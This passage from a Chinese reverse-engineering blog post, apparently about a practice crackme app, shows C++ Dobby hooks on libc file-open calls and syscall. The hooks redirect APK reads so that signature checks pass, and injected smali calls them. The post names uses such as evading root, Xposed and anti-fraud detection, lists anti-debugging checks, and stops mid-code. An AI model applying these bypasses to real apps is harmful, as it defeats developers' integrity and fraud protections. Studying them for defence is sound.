<figure class="highlight smali"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;p1&#125;, <span class="class">Lzhengji/Hook/ServiceManagerWraper;</span>-&gt;hookPMS(<span class="class">Landroid/content/Context;</span>)V</span><br></pre></td></tr></table></div></figure>

<p>注意要和HookPMS.dex中的路径一致</p>
</li>
<li><p>Pixel4不行，用模拟器可以跑通</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240125173039659.png" alt="image-20240125173039659"></p>
</li>
</ul>

        <h3 id="IO重定向"   >
          <a href="#IO重定向" class="heading-link"><i class="fas fa-link"></i></a><a href="#IO重定向" class="headerlink" title="IO重定向"></a>IO重定向</h3>
      
        <h4 id="功能"   >
          <a href="#功能" class="heading-link"><i class="fas fa-link"></i></a><a href="#功能" class="headerlink" title="功能"></a>功能</h4>
      <ul>
<li>让文件只读不可写</li>
<li>禁止访问文件</li>
<li>路径替换</li>
</ul>

        <h4 id="用处"   >
          <a href="#用处" class="heading-link"><i class="fas fa-link"></i></a><a href="#用处" class="headerlink" title="用处"></a>用处</h4>
      <ul>
<li>过签名校验，当校验时让它读取原包</li>
<li>风控对抗，某些APP会记录启动次数</li>
<li>过Root检测、Xposed检测</li>
</ul>

        <h4 id="原理"   >
          <a href="#原理" class="heading-link"><i class="fas fa-link"></i></a><a href="#原理" class="headerlink" title="原理"></a>原理</h4>
      <p>hook了底层打开文件的一些路径 </p>
<figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;  </span><br><span class="line">string packname;  </span><br><span class="line">string origpath;  </span><br><span class="line">string fakepath;  </span><br><span class="line"></span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*orig_open)(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, ...);  </span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*orig_openat)(<span class="keyword">int</span>,<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, ...);  </span><br><span class="line">FILE *(*orig_fopen)(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode);  </span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">long</span> <span class="params">(*orig_syscall)</span><span class="params">(<span class="keyword">long</span> number, ...)</span></span>;  </span><br><span class="line"><span class="built_in"><span class="keyword">int</span></span> (*orig__NR_openat)(<span class="keyword">int</span>,<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, ...);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* (*orig_dlopen_CI)(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> flag);  </span><br><span class="line"><span class="keyword">void</span>* (*orig_dlopen_CIV)(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">int</span> flag, <span class="keyword">const</span> <span class="keyword">void</span> *extinfo);  </span><br><span class="line"><span class="keyword">void</span>* (*orig_dlopen_CIVV)(<span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">int</span> flags, <span class="keyword">const</span> <span class="keyword">void</span> *extinfo, <span class="keyword">void</span> *caller_addr);  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">bool</span> <span class="title">needs_mode</span><span class="params">(<span class="keyword">int</span> flags)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> ((flags &amp; O_CREAT) == O_CREAT) || ((flags &amp; O_TMPFILE) == O_TMPFILE);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">startsWith</span><span class="params">(string str, string sub)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> str.<span class="built_in">find</span>(sub)==<span class="number">0</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">endsWith</span><span class="params">(string s,string sub)</span></span>&#123;  </span><br><span class="line">    <span class="keyword">return</span> s.<span class="built_in">rfind</span>(sub)==(s.<span class="built_in">length</span>()-sub.<span class="built_in">length</span>());  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isOrigAPK</span><span class="params">(string  path)</span></span>&#123;  </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(path==origpath)&#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//该函数的功能是在打开一个文件时进行拦截，并在满足特定条件时将文件路径替换为另一个路径  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fake_open 函数有三个参数：  </span></span><br><span class="line"><span class="comment">//pathname：一个字符串，表示要打开的文件的路径。  </span></span><br><span class="line"><span class="comment">//flags：一个整数，表示打开文件的方式，例如只读、只写、读写等。  </span></span><br><span class="line"><span class="comment">//mode（可选参数）：一个整数，表示打开文件时应用的权限模式。  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fake_open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, ...)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">mode_t</span> mode = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">needs_mode</span>(flags)) &#123;  </span><br><span class="line">        va_list args;  </span><br><span class="line">        <span class="built_in">va_start</span>(args, flags);  </span><br><span class="line">        mode = <span class="keyword">static_cast</span>&lt;<span class="keyword">mode_t</span>&gt;(<span class="built_in">va_arg</span>(args, <span class="keyword">int</span>));  </span><br><span class="line">        <span class="built_in">va_end</span>(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="comment">//LOGI(&quot;open,  path: %s, flags: %d, mode: %d&quot;,pathname, flags ,mode);  </span></span><br><span class="line">    <span class="comment">//这里被写死了，只能在这个路径下放入原包</span></span><br><span class="line">    string cpp_path= pathname;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isOrigAPK</span>(cpp_path))&#123;  </span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="string">&quot;libc_open, redirect: %s, ---&gt;: %s&quot;</span>,pathname, fakepath.<span class="built_in">data</span>());  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">orig_open</span>(<span class="string">&quot;/data/user/0/com.zj.wuaipojie/files/base.apk&quot;</span>, flags, mode);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span>  <span class="built_in">orig_open</span>(pathname, flags, mode);  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//该函数的功能是在打开一个文件时进行拦截，并在满足特定条件时将文件路径替换为另一个路径  </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//fake_openat 函数有四个参数：  </span></span><br><span class="line"><span class="comment">//fd：一个整数，表示要打开的文件的文件描述符。  </span></span><br><span class="line"><span class="comment">//pathname：一个字符串，表示要打开的文件的路径。  </span></span><br><span class="line"><span class="comment">//flags：一个整数，表示打开文件的方式，例如只读、只写、读写等。  </span></span><br><span class="line"><span class="comment">//mode（可选参数）：一个整数，表示打开文件时应用的权限模式。  </span></span><br><span class="line"><span class="comment">//openat 函数的作用类似于 open 函数，但是它使用文件描述符来指定文件路径，而不是使用文件路径本身。这样，就可以在打开文件时使用相对路径，而不必提供完整的文件路径。  </span></span><br><span class="line"><span class="comment">//例如，如果要打开相对于当前目录的文件，可以使用 openat 函数，而不是 open 函数，因为 open 函数只能使用绝对路径。  </span></span><br><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fake_openat</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">char</span> *pathname, <span class="keyword">int</span> flags, ...)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">mode_t</span> mode = <span class="number">0</span>;  </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">needs_mode</span>(flags)) &#123;  </span><br><span class="line">        va_list args;  </span><br><span class="line">        <span class="built_in">va_start</span>(args, flags);  </span><br><span class="line">        mode = <span class="keyword">static_cast</span>&lt;<span class="keyword">mode_t</span>&gt;(<span class="built_in">va_arg</span>(args, <span class="keyword">int</span>));  </span><br><span class="line">        <span class="built_in">va_end</span>(args);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="string">&quot;openat, fd: %d, path: %s, flags: %d, mode: %d&quot;</span>,fd ,pathname, flags ,mode);  </span><br><span class="line">    string cpp_path= pathname;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isOrigAPK</span>(cpp_path))&#123;  </span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="string">&quot;libc_openat, redirect: %s, ---&gt;: %s&quot;</span>,pathname, fakepath.<span class="built_in">data</span>());  </span><br><span class="line">        <span class="keyword">return</span>  <span class="built_in">orig_openat</span>(fd,fakepath.<span class="built_in">data</span>(), flags, mode);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">orig_openat</span>(fd,pathname, flags, mode);  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"><span class="function">FILE *<span class="title">fake_fopen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *mode)</span> </span>&#123;  </span><br><span class="line"></span><br><span class="line">    string cpp_path= filename;  </span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">isOrigAPK</span>(cpp_path))&#123;  </span><br><span class="line">        <span class="keyword">return</span>  <span class="built_in">orig_fopen</span>(fakepath.<span class="built_in">data</span>(), mode);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">orig_fopen</span>(filename, mode);  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="comment">//该函数的功能是在执行系统调用时进行拦截，并在满足特定条件时修改系统调用的参数。  </span></span><br><span class="line"><span class="comment">//syscall 函数是一个系统调用，是程序访问内核功能的方法之一。使用 syscall 函数可以调用大量的系统调用，它们用于实现操作系统的各种功能，例如打开文件、创建进程、分配内存等。  </span></span><br><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">long</span> <span class="title">fake_syscall</span><span class="params">(<span class="keyword">long</span> number, ...)</span> </span>&#123;  </span><br><span class="line">    <span class="keyword">void</span> *arg[<span class="number">7</span>];  </span><br><span class="line">    va_list list;  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">va_start</span>(list, number);  </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">7</span>; ++i) &#123;  </span><br><span class="line">        arg[i] = <span class="built_in">va_arg</span>(list, <span class="keyword">void</span> *);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">va_end</span>(list);  </span><br><span class="line">    <span class="keyword">if</span> (number == __NR_openat)&#123;  </span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">char</span> *cpp_path = <span class="keyword">static_cast</span>&lt;<span class="keyword">const</span> <span class="keyword">char</span> *&gt;(arg[<span class="number">1</span>]);  </span><br><span class="line">        <span class="built_in">LOGI</span>(<span class="string">&quot;syscall __NR_openat, fd: %d, path: %s, flags: %d, mode: %d&quot;</span>,arg[<span class="number">0</span>] ,arg[<span class="number">1</span>], arg[<span class="number">2</span>], arg[<span class="number">3</span>]);  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">isOrigAPK</span>(cpp_path))&#123;  </span><br><span class="line">            <span class="built_in">LOGI</span>(<span class="string">&quot;syscall __NR_openat, redirect: %s, ---&gt;: %s&quot;</span>,arg[<span class="number">1</span>], fakepath.<span class="built_in">data</span>());  </span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">orig_syscall</span>(number,arg[<span class="number">0</span>], fakepath.<span class="built_in">data</span>() ,arg[<span class="number">2</span>],arg[<span class="number">3</span>]);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">orig_syscall</span>(number, arg[<span class="number">0</span>], arg[<span class="number">1</span>], arg[<span class="number">2</span>], arg[<span class="number">3</span>], arg[<span class="number">4</span>], arg[<span class="number">5</span>], arg[<span class="number">6</span>]);  </span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">//函数的功能是获取当前应用的包名、APK 文件路径以及库文件路径，并将这些信息保存在全局变量中  </span></span><br><span class="line"><span class="comment">//函数调用 GetObjectClass 和 GetMethodID 函数来获取 context 对象的类型以及 getPackageName 方法的 ID。然后，函数调用 CallObjectMethod 函数来调用 getPackageName 方法，获取当前应用的包名。最后，函数使用 GetStringUTFChars 函数将包名转换为 C 字符串，并将包名保存在 packname 全局变量中  </span></span><br><span class="line"><span class="comment">//接着，函数使用 fakepath 全局变量保存了 /data/user/0/&lt;packname&gt;/files/base.apk 这样的路径，其中 &lt;packname&gt; 是当前应用的包名。  </span></span><br><span class="line"><span class="comment">//然后，函数再次调用 GetObjectClass 和 GetMethodID 函数来获取 context 对象的类型以及 getApplicationInfo 方法的 ID。然后，函数调用 CallObjectMethod 函数来调用 getApplicationInfo 方法，获取当前应用的 ApplicationInfo 对象。  </span></span><br><span class="line"><span class="comment">//它先调用 GetObjectClass 函数获取 ApplicationInfo 对象的类型，然后调用 GetFieldID 函数获取 sourceDir 字段的 ID。接着，函数使用 GetObjectField 函数获取 sourceDir 字段的值，并使用 GetStringUTFChars 函数将其转换为 C 字符串。最后，函数将 C 字符串保存在 origpath 全局变量中，表示当前应用的 APK 文件路径。  </span></span><br><span class="line"><span class="comment">//最后，函数使用 GetFieldID 和 GetObjectField 函数获取 nativeLibraryDir 字段的值，并使用 GetStringUTFChars 函数将其转换为 C 字符串。函数最后调用 LOGI 函数打印库文件路径，但是并没有将其保存在全局变量中。  </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL  </span></span><br><span class="line"><span class="function"><span class="title">Java_com_zj_wuaipojie_util_SecurityUtil_hook</span><span class="params">(JNIEnv *env, jclass clazz, jobject context)</span> </span>&#123;  </span><br><span class="line">    jclass conext_class = env-&gt;<span class="built_in">GetObjectClass</span>(context);  </span><br><span class="line">    jmethodID methodId_pack = env-&gt;<span class="built_in">GetMethodID</span>(conext_class, <span class="string">&quot;getPackageName&quot;</span>,  </span><br><span class="line">                                               <span class="string">&quot;()Ljava/lang/String;&quot;</span>);  </span><br><span class="line">    <span class="keyword">auto</span> packname_js = <span class="keyword">reinterpret_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">CallObjectMethod</span>(context, methodId_pack));  </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *pn = env-&gt;<span class="built_in">GetStringUTFChars</span>(packname_js, <span class="number">0</span>);  </span><br><span class="line">    packname = <span class="built_in">string</span>(pn);  </span><br><span class="line"></span><br><span class="line">    env-&gt;<span class="built_in">ReleaseStringUTFChars</span>(packname_js, pn);  </span><br><span class="line">    <span class="comment">//LOGI(&quot;packname: %s&quot;, packname.data());  </span></span><br><span class="line">    fakepath= <span class="string">&quot;/data/user/0/&quot;</span>+ packname +<span class="string">&quot;/files/base.apk&quot;</span>;  </span><br><span class="line"></span><br><span class="line">    jclass conext_class2 = env-&gt;<span class="built_in">GetObjectClass</span>(context);  </span><br><span class="line">    jmethodID methodId_pack2 = env-&gt;<span class="built_in">GetMethodID</span>(conext_class2,<span class="string">&quot;getApplicationInfo&quot;</span>,<span class="string">&quot;()Landroid/content/pm/ApplicationInfo;&quot;</span>);  </span><br><span class="line">    jobject application_info = env-&gt;<span class="built_in">CallObjectMethod</span>(context,methodId_pack2);  </span><br><span class="line">    jclass pm_clazz = env-&gt;<span class="built_in">GetObjectClass</span>(application_info);  </span><br><span class="line"></span><br><span class="line">    jfieldID package_info_id = env-&gt;<span class="built_in">GetFieldID</span>(pm_clazz,<span class="string">&quot;sourceDir&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>);  </span><br><span class="line">    <span class="keyword">auto</span> sourceDir_js = <span class="keyword">reinterpret_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(application_info,package_info_id));  </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *sourceDir = env-&gt;<span class="built_in">GetStringUTFChars</span>(sourceDir_js, <span class="number">0</span>);  </span><br><span class="line">    origpath = <span class="built_in">string</span>(sourceDir);  </span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="string">&quot;sourceDir: %s&quot;</span>, sourceDir);  </span><br><span class="line"></span><br><span class="line">    jfieldID package_info_id2 = env-&gt;<span class="built_in">GetFieldID</span>(pm_clazz,<span class="string">&quot;nativeLibraryDir&quot;</span>,<span class="string">&quot;Ljava/lang/String;&quot;</span>);  </span><br><span class="line">    <span class="keyword">auto</span> nativeLibraryDir_js = <span class="keyword">reinterpret_cast</span>&lt;jstring&gt;(env-&gt;<span class="built_in">GetObjectField</span>(application_info,package_info_id2));  </span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *nativeLibraryDir = env-&gt;<span class="built_in">GetStringUTFChars</span>(nativeLibraryDir_js, <span class="number">0</span>);  </span><br><span class="line">    <span class="built_in">LOGI</span>(<span class="string">&quot;nativeLibraryDir: %s&quot;</span>, nativeLibraryDir);  </span><br><span class="line">    <span class="comment">//LOGI(&quot;%s&quot;, &quot;Start Hook&quot;);  </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//启动hook  </span></span><br><span class="line">    <span class="keyword">void</span> *handle = <span class="built_in">dlopen</span>(<span class="string">&quot;libc.so&quot;</span>,RTLD_NOW);  </span><br><span class="line">    <span class="keyword">auto</span> pagesize = <span class="built_in">sysconf</span>(_SC_PAGE_SIZE);  </span><br><span class="line">    <span class="keyword">auto</span> addr = ((<span class="keyword">uintptr_t</span>)<span class="built_in">dlsym</span>(handle,<span class="string">&quot;open&quot;</span>) &amp; (-pagesize));  </span><br><span class="line">    <span class="keyword">auto</span> addr2 = ((<span class="keyword">uintptr_t</span>)<span class="built_in">dlsym</span>(handle,<span class="string">&quot;openat&quot;</span>) &amp; (-pagesize));  </span><br><span class="line">    <span class="keyword">auto</span> addr3 = ((<span class="keyword">uintptr_t</span>)fopen) &amp; (-pagesize);  </span><br><span class="line">    <span class="keyword">auto</span> addr4 = ((<span class="keyword">uintptr_t</span>)syscall) &amp; (-pagesize);  </span><br><span class="line"></span><br><span class="line">    <span class="comment">//解除部分机型open被保护  </span></span><br><span class="line">    <span class="built_in">mprotect</span>((<span class="keyword">void</span>*)addr, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC);  </span><br><span class="line">    <span class="built_in">mprotect</span>((<span class="keyword">void</span>*)addr2, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC);  </span><br><span class="line">    <span class="built_in">mprotect</span>((<span class="keyword">void</span>*)addr3, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC);  </span><br><span class="line">    <span class="built_in">mprotect</span>((<span class="keyword">void</span>*)addr4, pagesize, PROT_READ | PROT_WRITE | PROT_EXEC);  </span><br><span class="line"></span><br><span class="line">    <span class="built_in">DobbyHook</span>((<span class="keyword">void</span> *)<span class="built_in">dlsym</span>(handle,<span class="string">&quot;open&quot;</span>), (<span class="keyword">void</span> *)fake_open, (<span class="keyword">void</span> **)&amp;orig_open);  </span><br><span class="line">    <span class="built_in">DobbyHook</span>((<span class="keyword">void</span> *)<span class="built_in">dlsym</span>(handle,<span class="string">&quot;openat&quot;</span>), (<span class="keyword">void</span> *)fake_openat, (<span class="keyword">void</span> **)&amp;orig_openat);  </span><br><span class="line">    <span class="built_in">DobbyHook</span>((<span class="keyword">void</span> *)fopen, (<span class="keyword">void</span> *)fake_fopen, (<span class="keyword">void</span>**)&amp;orig_fopen);  </span><br><span class="line">    <span class="built_in">DobbyHook</span>((<span class="keyword">void</span> *)syscall, (<span class="keyword">void</span> *)fake_syscall, (<span class="keyword">void</span> **)&amp;orig_syscall);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h4 id="具体实现"   >
          <a href="#具体实现" class="heading-link"><i class="fas fa-link"></i></a><a href="#具体实现" class="headerlink" title="具体实现"></a>具体实现</h4>
      <p>查找到check_crc的调用地方</p>
<p>点击罗盘</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240124151147745.png" alt="image-20240124151147745"></p>
<p>长按check_crc</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240124151213668.png" alt="image-20240124151213668"></p>
<p>即可找到目的方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240124151231022.png" alt="aaa"></p>
<p>然后在开头写入如下代码，注意这个只是调用代码，实际的重定向的代码是一个so中的代码，作者已经写入到安装包了，我们只需要调用即可，后续需要自己将so打入apk</p>
<figure class="highlight smali"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sget-object p10, <span class="class">Lcom/zj/wuaipojie/util/ContextUtils;</span>-&gt;INSTANCE:<span class="class">Lcom/zj/wuaipojie/util/ContextUtils;</span>  </span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;p10&#125;, <span class="class">Lcom/zj/wuaipojie/util/ContextUtils;</span>-&gt;getContext()<span class="class">Landroid/content/Context;</span>  </span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">move-result-object </span>p10  </span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-static </span>&#123;p10&#125;, <span class="class">Lcom/zj/wuaipojie/util/SecurityUtil;</span>-&gt;hook(<span class="class">Landroid/content/Context;</span>)V</span><br></pre></td></tr></table></div></figure>

<p>随后在软件数据目录中新建files文件夹，放入原安装包</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240124151726068.png" alt="image-20240124151726068"></p>
<p>重新命名为base.apk</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20240124151959135.png" alt="image-20240124151959135"></p>
<p>在我的测试中，hash可以过，crc过不了</p>

        <h3 id="反调试"   >
          <a href="#反调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3>
      
        <h4 id="反调试方法"   >
          <a href="#反调试方法" class="heading-link"><i class="fas fa-link"></i></a><a href="#反调试方法" class="headerlink" title="反调试方法"></a>反调试方法</h4>
      <ul>
<li><p>安卓自带的</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fun checkForDebugger() &#123;  </span><br><span class="line">    if (Debug.isDebuggerConnected()) &#123;  </span><br><span class="line">        // 如果调试器已连接，则终止应用程序  </span><br><span class="line">        System.exit(0)  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>debuggable属性</p>
<p>先检测手机的debuggable属性，没有检测到再检测APK内部的xml的那个debuggable属性</p>
</li>
<li><p>ptrace检测</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">ptrace_protect</span><span class="params">()</span><span class="comment">//ptrace附加自身线程 会导致此进程TracerPid 变为父进程的TracerPid 即zygote</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ptrace(PTRACE_TRACEME,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);;<span class="comment">//返回-1即为已经被调试</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure></li>
<li><p>调试进程名称检测</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">SearchObjProcess</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE* pfile=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    pfile=popen(<span class="string">&quot;ps&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span 